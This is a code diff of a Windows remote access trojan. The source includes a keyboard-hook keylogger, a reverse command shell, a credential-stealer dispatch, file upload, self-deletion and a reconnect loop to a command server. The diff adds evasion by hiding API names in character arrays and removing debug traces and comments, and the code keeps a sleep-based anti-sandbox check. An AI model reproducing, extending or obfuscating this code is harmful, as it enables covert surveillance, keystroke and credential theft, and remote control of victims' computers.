@@ -1,5 +1,4 @@
 #define _WIN32_WINNT 0x0600
-#define _CRT_SECURE_NO_WARNINGS
 
 #include <winsock2.h>
 #include <windows.h>
@@ -74,11 +73,15 @@ pUnhookWindowsHookEx fnUnhookWindowsHookEx = NULL;
 pCallNextHookEx fnCallNextHookEx = NULL;
 
 void LoadCriticalAPIs() {
-    HMODULE hUser32 = LoadLibraryA("user32.dll");
+    char u32[] = {'u','s','e','r','3','2','.','d','l','l',0};
+    HMODULE hUser32 = LoadLibraryA(u32);
     if (hUser32) {
-        fnSetWindowsHookExA = (pSetWindowsHookExA)GetProcAddress(hUser32, "SetWindowsHookExA");
-        fnUnhookWindowsHookEx = (pUnhookWindowsHookEx)GetProcAddress(hUser32, "UnhookWindowsHookEx");
-        fnCallNextHookEx = (pCallNextHookEx)GetProcAddress(hUser32, "CallNextHookEx");
+        char swh[] = {'S','e','t','W','i','n','d','o','w','s','H','o','o','k','E','x','A',0};
+        fnSetWindowsHookExA = (pSetWindowsHookExA)GetProcAddress(hUser32, swh);
+        char uhw[] = {'U','n','h','o','o','k','W','i','n','d','o','w','s','H','o','o','k','E','x',0};
+        fnUnhookWindowsHookEx = (pUnhookWindowsHookEx)GetProcAddress(hUser32, uhw);
+        char cnh[] = {'C','a','l','l','N','e','x','t','H','o','o','k','E','x',0};
+        fnCallNextHookEx = (pCallNextHookEx)GetProcAddress(hUser32, cnh);
     }
 }
 
@@ -155,7 +158,7 @@ void Restart(); void Uninstall(); void Update(const char* u); void Melt(char* s)
 wstring Utf8ToWide(const string& s) { if (s.empty()) return L""; int sz = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0); wstring w(sz, 0); MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], sz); if (sz > 0) w.resize(sz - 1); return w; }
 string WideToUtf8(const wstring& w) { if (w.empty()) return ""; int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, NULL, 0, NULL, NULL); string s(sz, 0); WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, NULL, NULL); if (sz > 0) s.resize(sz - 1); return s; }
 bool RecvAll(SOCKET s, char* b, int l) { int t = 0; while (t < l) { int r = recv(s, b + t, l - t, 0); if (r <= 0) return false; t += r; } return true; }
-string EscapeJson(const string& in) { string out = ""; for (char c : in) { if (c == '\\') out.append("\\\\"); else if (c == '"') out.append("\""); else if ((unsigned char)c < 32) { char buf[16]; snprintf(buf, sizeof(buf), "\u%04x", (unsigned int)c); out.append(buf); } else out.push_back(c); } return out; }
+string EscapeJson(const string& in) { string out = ""; for (char c : in) { if (c == '\\') out.append("\\\\"); else if (c == '"') out.append("\""); else if ((unsigned char)c < 32) { char buf[16]; snprintf(buf, sizeof(buf), "\\u%04x", (unsigned int)c); out.append(buf); } else out.push_back(c); } return out; }
 int GetEncoderClsid(const WCHAR* f, CLSID* p) { UINT n = 0, s = 0; GetImageEncodersSize(&n, &s); if (s == 0) return -1; ImageCodecInfo* pi = (ImageCodecInfo*)(malloc(s)); GetImageEncoders(n, s, pi); for (UINT j = 0; j < n; ++j) { if (wcscmp(pi[j].MimeType, f) == 0) { *p = pi[j].Clsid; free(pi); return j; } } free(pi); return -1; }
 
 // --- Extra Helpers ---
@@ -242,7 +245,6 @@ void SysInternalOpen(char* p, DWORD s) {
 
 // --- Keylogger & Chat & Network ---
 LRESULT CALLBACK LLKbdProc(int n, WPARAM w, LPARAM l) { if (n == HC_ACTION && bKeylogRunning && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) { KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)l; char t[256]; GetWindowTextA(GetForegroundWindow(), t, 256); string log = ""; if (strcmp(t, lastWindowTitle) != 0) { strncpy(lastWindowTitle, t, sizeof(lastWindowTitle)-1); log.append("\n["); log.append(t); log.append("] "); } if (p->vkCode >= 0x30 && p->vkCode <= 0x5A) log.push_back((char)p->vkCode); else if (p->vkCode == VK_SPACE) log.append(" "); else if (p->vkCode == VK_RETURN) log.append("[ENTER]"); else { char b[16]; snprintf(b, sizeof(b), "[%d]", (int)p->vkCode); log.append(b); } SendPacket(TYPE_KEYLOG_DATA, log.c_str(), (int)log.length()); } 
-    // Use dynamic call if loaded
     if (fnCallNextHookEx) return fnCallNextHookEx(hKeyboardHook, n, w, l);
     return CallNextHookEx(hKeyboardHook, n, w, l); 
 }
@@ -262,7 +264,7 @@ void StopChat() { if (bChatRunning) { bChatRunning = false; bChatForceClose = tr
 void AppendChatMessage(char* t) { if (hChatWnd && hChatEditHist) { wstring msg = Utf8ToWide(chatAdminName) + L": " + Utf8ToWide(t) + L"\r\n"; int n = GetWindowTextLengthW(hChatEditHist); SendMessageW(hChatEditHist, EM_SETSEL, (WPARAM)n, (LPARAM)n); SendMessageW(hChatEditHist, EM_REPLACESEL, 0, (LPARAM)msg.c_str()); } }
 DWORD WINAPI ReadFromCmd(LPVOID lpParam) { char buffer[BUF_SIZE]; DWORD r, a; while (true) { if (!PeekNamedPipe(hChildStd_OUT_Rd, 0, 0, 0, &a, 0)) break; if (a > 0 && ReadFile(hChildStd_OUT_Rd, buffer, BUF_SIZE, &r, 0) && r > 0) SendPacket(TYPE_SHELL_OUT, buffer, (int)r); Sleep(50); } return 0; }
 DWORD WINAPI WriteToCmd(LPVOID p) {
-    CoInitialize(NULL); char hB[12]; while (true) {
+    char hB[12]; while (true) {
         if (!RecvAll(g_Socket, hB, 12)) break;
         PacketHeader* h = (PacketHeader*)hB; if (h->magic != 0xBEEFCAFE) break;
         char* b = NULL; if (h->length > 0) { b = (char*)malloc(h->length + 1); if (!RecvAll(g_Socket, b, h->length)) { free(b); break; } b[h->length] = 0; }
@@ -307,15 +309,14 @@ DWORD WINAPI WriteToCmd(LPVOID p) {
         else if (h->type == TYPE_STEALER_EXEC) { if (b) Stealer::Run(b); }
         else if (h->type == TYPE_FILE_UP_REQ) { if (b) WriteLocalFile(b, h->length); }
         if (b) free(b);
-    } CoUninitialize(); return 0;
+    }
+    return 0;
 }
 
 void RunAgent() {
-    LoadCriticalAPIs(); // Initialize dynamic APIs
-    OutputDebugStringA("[AGENT] Thread Started\n");
+    LoadCriticalAPIs(); 
     monitors = new vector<MonitorInfo>();
     setvbuf(stdout, NULL, _IONBF, 0); InitializeCriticalSection(&g_SocketLock); GdiplusStartupInput gsi; ULONG_PTR gt; GdiplusStartup(&gt, &gsi, NULL);
-    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED); bCtxInit = (ma_context_init(NULL, 0, NULL, &globalCtx) == MA_SUCCESS);
     WSADATA wd; WSAStartup(MAKEWORD(2, 2), &wd); struct sockaddr_in srv; srv.sin_family = AF_INET; srv.sin_addr.s_addr = inet_addr(SERVER_IP); srv.sin_port = htons(SERVER_PORT);
     while (true) {
         g_Socket = socket(AF_INET, SOCK_STREAM, 0); if (connect(g_Socket, (struct sockaddr*)&srv, sizeof(srv)) < 0) { Sleep(5000); continue; }
@@ -332,15 +333,11 @@ void RunAgent() {
     }
 }
 
-// GUI Entry Point (Standard EXE)
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Simple Anti-Sandbox (Sleep Check)
     DWORD t1 = GetTickCount();
     Sleep(2500);
     DWORD t2 = GetTickCount();
-    if ((t2 - t1) < 2000) return 0; // Fast-forwarded
-
-    // Execute Main Logic
+    if ((t2 - t1) < 2000) return 0;
     RunAgent();
     return 0;
 }
